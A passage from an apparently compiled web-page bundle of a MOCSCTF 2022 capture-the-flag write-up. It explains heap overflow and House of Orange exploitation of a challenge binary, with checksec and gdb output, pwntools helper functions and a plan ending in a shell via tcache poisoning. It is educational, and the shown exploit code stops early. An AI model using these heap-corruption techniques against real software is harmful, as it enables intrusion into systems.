h=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var m=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var t=a=\u003el(a,\"__esModule\",{value:!0});var N=(a,c)=\u003e()=\u003e(c||a((c={exports:{}}).exports,c),c.exports),k=(a,c)=\u003e{t(a);for(var s in c)l(a,s,{get:c[s],enumerable:!0})},x=(a,c,s)=\u003e{if(c\u0026\u0026typeof c==\"object\"||typeof c==\"function\")for(let n of p(c))!u.call(a,n)\u0026\u0026n!==\"default\"\u0026\u0026l(a,n,{get:()=\u003ec[n],enumerable:!(s=h(c,n))||s.enumerable});return a},f=a=\u003ex(t(l(a!=null?d(m(a)):{},\"default\",a\u0026\u0026a.__esModule\u0026\u0026\"default\"in a?{get:()=\u003ea.default,enumerable:!0}:{value:a,enumerable:!0})),a);var r=N((z,o)=\u003e{o.exports=_jsx_runtime});var y={};k(y,{default:()=\u003ew,frontmatter:()=\u003eg});var e=f(r()),g={title:\"MOCSCTF 2022 \\u2013 full of orange\",date:\"2022-02-28\",draft:!1,authors:[\"Johnathan\"],tags:[\"MOCSCTF 2022\",\"pwn\",\"heap\",\"Shell\",\"overflow\",\"Binary Exploit\"],summary:\"Heap overflow for shell.\",canonical:\"https://github.com/nhtri2003gmail/writeup-mocsctf2022.mocsctf.com-orange\"};function b(a={}){let{wrapper:c}=a.components||{};return c?(0,e.jsx)(c,Object.assign({},a,{children:(0,e.jsx)(s,{})})):s();function s(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",h3:\"h3\",ul:\"ul\",li:\"li\",hr:\"hr\",p:\"p\",code:\"code\",pre:\"pre\",img:\"img\",strong:\"strong\",ol:\"ol\",br:\"br\"},a.components),{TOCInline:i}=n;return i||_(\"TOCInline\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"full-of-orange\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#full-of-orange\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Full of Orange\"]}),`\n`,(0,e.jsx)(i,{toc:a.toc,exclude:[\"Full of Orange\",\"Reference source\"],toHeading:3}),`\n`,(0,e.jsxs)(n.h3,{id:\"reference-source\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#reference-source\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Reference source\"]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsx)(n.li,{children:(0,e.jsx)(n.a,{href:\"https://1ce0ear.github.io/2017/11/26/study-house-of-orange/\",children:\"Understanding the house of orange \\u2013 1ce0ear\"})}),`\n`,(0,e.jsx)(n.li,{children:(0,e.jsx)(n.a,{href:\"https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html\",children:\"HITCON CTF Qual 2016 - House of Orange Write up \\u2013 Pwning My Life\"})}),`\n`,(0,e.jsx)(n.li,{children:(0,e.jsx)(n.a,{href:\"https://github.com/shellphish/how2heap\",children:\"shellphish/how2heap \\u2013 GitHub\"})}),`\n`,(0,e.jsx)(n.li,{children:(0,e.jsx)(n.a,{href:\"https://dystopia.sg/seccon-beginners-2021-freeless/\",children:\"SECCON BEGINNERS: FREELESS (PWN) \\u2013 THE DYSTOPIAN KNIGHT\"})}),`\n`]}),`\n`,(0,e.jsx)(n.hr,{}),`\n`,(0,e.jsxs)(n.p,{children:[\"Origin challenge link: \",(0,e.jsx)(n.a,{href:\"https://mocsctf2022.mocsctf.com/challenges\",children:\"https://mocsctf2022.mocsctf.com/challenges\"})]}),`\n`,(0,e.jsxs)(n.p,{children:[\"You can also download challenge in my repo: \",(0,e.jsx)(n.a,{href:\"https://github.com/nhtri2003gmail/writeup-mocsctf2022.mocsctf.com-orange/blob/master/orange.zip\",children:\"orange.zip\"})]}),`\n`,(0,e.jsx)(n.p,{children:\"There will be 2 files in zip:\"}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsx)(n.li,{children:\"freefree\"}),`\n`,(0,e.jsx)(n.li,{children:\"libc-2.31.so\"}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Download zip, then extract and use \",(0,e.jsx)(n.code,{children:\"pwninit\"}),\" to patch libc to challenge file. And now let\\u2019s start!\"]}),`\n`,(0,e.jsxs)(n.h2,{id:\"1-find-bug\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#1-find-bug\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"1. Find bug\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"First, we use \",(0,e.jsx)(n.code,{children:\"file\"}),\" command to check for basic infomation:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"file\"}),` freefree\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"freefree: ELF \",(0,e.jsx)(n.span,{className:\"token number\",children:\"64\"}),\"-bit LSB pie executable, x86-64, version \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"SYSV\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\", dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"sha1\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"88c0525daecc504cb81ee1e9104e218cfa4ffdc6, \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" GNU/Linux \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3.2\"}),`.0, not stripped\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"This is a 64-bit file without being stripped. Next, we will use \",(0,e.jsx)(n.code,{children:\"checksec\"}),\" to check for all security of challenge file:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`$ checksec freefree\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    PIE:      PIE enabled\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Well, it\\u2019s \",(0,e.jsx)(n.code,{children:\"PIE enabled\"}),\", quite hard for us when we need to debug things. Also \",(0,e.jsx)(n.code,{children:\"NX enabled\"}),\" which means we cannot get our shellcode on stack works.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Finally, let\\u2019s fire up ghidra and get the main flow of program. There are just 1 interesing function is main() with 4 option \",(0,e.jsx)(n.code,{children:\"malloc\"}),\", \",(0,e.jsx)(n.code,{children:\"gets\"}),\" which we input to chunk, \",(0,e.jsx)(n.code,{children:\"puts\"}),\" which print out data of that chunk terminated by null-byte and \",(0,e.jsx)(n.code,{children:\"exit\"}),\".\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Let\\u2019s run the program to get it easily. At the menu, we can see things like this:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/menu.png\",alt:\"menu.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"It tells us that we could use a technique called \",(0,e.jsx)(n.a,{href:\"https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c\",children:\"House of Orange\"}),\". Analizing in ghidra and run in terminal, we know that it can take the variable name from \",(0,e.jsx)(n.code,{children:\"A\"}),\" to \",(0,e.jsx)(n.code,{children:\"Z\"}),\" by getting its index:\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/variable.png\",alt:\"variable.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So that \",(0,e.jsx)(n.code,{children:\"X\"}),\" can be from \",(0,e.jsx)(n.code,{children:\"A\"}),\" to \",(0,e.jsx)(n.code,{children:\"Z\"}),\":\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/input_var_terminal.png\",alt:\"input_var_terminal.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"This means we can contain and control upto 25 chunk. And one more thing we can notice is that with each chunk, we can write unlimited data to that chunk, hence overwrite the next chunk \\u2192 \",(0,e.jsx)(n.strong,{children:\"Heap Overflow\"}),\":\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/gets_main.png\",alt:\"gets_main.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And that\\u2019s all we can find, just 25 chunks with \",(0,e.jsx)(n.strong,{children:\"Heap Overflow\"}),\" and no free(), let\\u2019s see the magic right now!\"]}),`\n`,(0,e.jsxs)(n.h2,{id:\"2-brainstorming\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#2-brainstorming\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"2. Brainstorming\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"If you are not familiar with heap, just read this to know about all kinds of chunk: \",(0,e.jsx)(n.a,{href:\"https://guyinatuxedo.github.io/25-heap/index.html\",children:\"https://guyinatuxedo.github.io/25-heap/index.html\"})]}),`\n`,(0,e.jsxs)(n.h3,{id:\"technique\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#technique\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Technique\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"The main thing to remember is that if we \",(0,e.jsx)(n.code,{children:\"malloc(0x1000)\"}),\" but top chunk size is just 0x300, which means that top chunk cannot satisfy the malloc. Hence, that top chunk will be freed and program will malloc 0x1000 byte on the next page of heap.\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`---------------------                    -----------------------\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`|    some chunks    |                    |     some chunks     |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`---------------------   malloc(0x1000)   -----------------------\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`| top chunk (0x300) |  ---------------\u003e  | freed chunk (0x300) |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`---------------------                    -----------------------\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`| unallocated space |                    | new chunk (0x1000)  |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`|                   |                    -----------------------\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`|                   |                    |    new top chunk    |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`---------------------                    -----------------------\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The other thing is that we can only malloc maximum 0x1000 bytes.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"To be clear, we will take this example below. The heap is usually allocated with a top chunk of size 0x21000. So when we malloc a 0x400-byte chunk, the top chunk will split itself and remain \",(0,e.jsx)(n.code,{children:\"0x21000 - 0x400 = 0x20c00\"}),\" with the bit \",(0,e.jsx)(n.code,{children:\"PREV_INUSE\"}),\" is set:\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/Technique_malloc1.png\",alt:\"Technique_malloc1.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Now we want to malloc maximum 0x1000, so the top chunk size need to be lower than 0x1000 to conduct this technique. Let\\u2019s assume that we can change the top chunk size by somehow. Because there is a check about the alignment of top chunk so just to make sure that:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`(top chunk address + top chunk size) % 0x1000 == 0\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"In our example, the size we want to overwrite into is \",(0,e.jsx)(n.code,{children:\"0xc00\"}),\":\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/Technique_malloc4.png\",alt:\"Technique_malloc4.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Address \",(0,e.jsx)(n.code,{children:\"0x55555555b000\"}),\" can satisfy the alignment so we will change top chunk size from 0x20c00 to 0xc00 with the \",(0,e.jsx)(n.code,{children:\"PREV_INUSE\"}),\" bit is set.\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/Technique_malloc2.png\",alt:\"Technique_malloc2.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So that when we malloc with a large number \",(0,e.jsx)(n.code,{children:\"malloc(0x1000)\"}),\", that top chunk cannot satisfy our malloc. Then that top chunk will be freed without any error:\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/mocsctf-2022/Technique_malloc3.png\",alt:\"Technique_malloc3.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Because top chunk size is 0xc00, which is large. So when top chunk is freed, it goes to unsorted bin.\"}),`\n`,(0,e.jsx)(n.p,{children:\"So if our top chunk size is small enough, which fit size of tcache, when we use this technique to free the top chunk, it will go to tcache bin. That\\u2019s sound interesting, right?\"}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"Summary technique:\",`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsx)(n.li,{children:\"We can malloc maximum 0x1000 bytes\"}),`\n`,(0,e.jsx)(n.li,{children:\"Malloc chunk larger than top chunk will free that top chunk\"}),`\n`,(0,e.jsxs)(n.li,{children:[\"Overwriting top chunk size require 2 constraints:\",`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"The size of top chunk need to be aligned with size of 0x1000\",(0,e.jsx)(n.br,{}),`\n`,(0,e.jsx)(n.code,{children:\"(top chunk address + top chunk size) % 0x1000 == 0\"})]}),`\n`,(0,e.jsxs)(n.li,{children:[\"The \",(0,e.jsx)(n.code,{children:\"PREV_INUSE\"}),\" bit need to be set\"]}),`\n`]}),`\n`]}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h3,{id:\"brainstorming\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#brainstorming\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Brainstorming\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"With the origin House of Orange, it first frees the top chunk, then fake the \",(0,e.jsx)(n.code,{children:\"_IO_list_all\"}),\" so that when we malloc again, it will execute \",(0,e.jsx)(n.code,{children:\"_IO_list_all\"}),\" with string \",(0,e.jsx)(n.code,{children:\"/bin/sh\"}),\". But that\\u2019s just for libc \\u2264 2.23 because those libc from \\u2265 2.24, the check is changed, faking \",(0,e.jsx)(n.code,{children:\"_IO_list_all\"}),\" is not successful anymore.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Because our provided libc is 2.31, we still can free the top chunk. First we make a large top chunk, then free it and we get libc main arena address. Next we will free 2 times with 2 small top chunk. So that those small top chunk can go to tcache bin (libc \\u2265 2.28 has tcache enabled).\"}),`\n`,(0,e.jsx)(n.p,{children:\"And then, we abuse the tcache link list by overwriting the forward pointer to whatever we want and we get the shell.\"}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"Summary:\",`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsx)(n.li,{children:\"Leak main arena address\"}),`\n`,(0,e.jsx)(n.li,{children:\"Free 2 small chunks\"}),`\n`,(0,e.jsx)(n.li,{children:\"Get shell\"}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h2,{id:\"3-exploit\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#3-exploit\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"3. Exploit\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Before we start our exploitation, I wrote these function to help our exploit more convenient\"}),`\n`,(0,e.jsxs)(\"details\",{children:[(0,e.jsx)(\"summary\",{children:\"Code snippet\"}),(0,e.jsx)(\"p\",{children:(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"getchar\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"return\"}),\" string\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"ascii_uppercase\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"malloc\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" num\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\u003e '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'{}=malloc({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" num\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"gets\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\u003e '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'gets({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  time\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sleep\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendline\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"puts\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\u003e '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'puts({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Receive data outside\"}),`\n`]})]})})})]}),`\n`,(0,e.jsx)(n.p,{children:\"And now let\\u2019s start!\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-1-leak-main-arena-address\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-1-leak-main-arena-address\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 1: Leak main arena address\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"At first, we will need a chunk with index 0 (means \",(0,e.jsx)(n.code,{children:\"A\"}),\" because we use the \",(0,e.jsx)(n.code,{children:\"getchar()\"}),\" function to turn index to char) with any size so that we can overwrite all the next chunk with just chunk \",(0,e.jsx)(n.code,{children:\"A\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`malloc(0, 0x10)\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Let\\u2019s see where our chunk \",(0,e.jsx)(n.code,{children:\"A\"}),\" is saved on stack after a first malloc:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571be0\\u2502+0x0000: \"A=malloc(16)\\\\n\"   \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571be8\\u2502+0x0008: 0x0000000a29363128 (\"(16)\\\\n\"?)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571bf0\\u2502+0x0010: 0x0000564641e852a0  \\u2192  0x0000000000000000    # Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571bf8\\u2502+0x0018: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c00\\u2502+0x0020: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c08\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c10\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffe68571c18\\u2502+0x0038: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`...\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So it will save our malloc address from chunk \",(0,e.jsx)(n.code,{children:\"A\"}),\" to chunk \",(0,e.jsx)(n.code,{children:\"Z\"}),\" down of the stack like that. Let\\u2019s check the top chunk size:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/20xg 0x0000564641e852a0-0x10\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85290: 0x0000000000000000  0x0000000000000021    \u003c-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852a0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852b0: 0x0000000000000000  0x0000000000020d51    \u003c-- Top chunk\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852c0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852d0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852e0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e852f0: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85300: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85310: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x564641e85320: 0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So our top chunk size now is \",(0,e.jsx)(n.code,{children:\"0x20d51\"}),\" with the \",(0,e.jsx)(n.code,{children:\"PREV_INUSE\"}),\" bit set. If we want to free that top chunk using the above technique (malloc a chunk larger than top chunk), we need to make our top chunk to be smaller because we can only malloc maximum 0x1000, which means we need to malloc around 20 chunks with size 0x1000. That would be long.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"So we will change the top chunk size with the \",(0,e.jsx)(n.strong,{children:\"Heap Overflow\"}),\" bug. Remember that our top chunk is aligned with 0x1000 so we need to calculate the top chunk size first:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`0x55fad6324000 - 0x55fad63232b0 = 0xd050\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So overwriting \",(0,e.jsx)(n.code,{children:\"0xd051\"}),\" (with \",(0,e.jsx)(n.code,{children:\"PREV_INUSE\"}),\" bit) to top chunk size and malloc \",(0,e.jsx)(n.code,{children:\"0x1000\"}),\" byte will free our top chunk. Code:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change topchunk 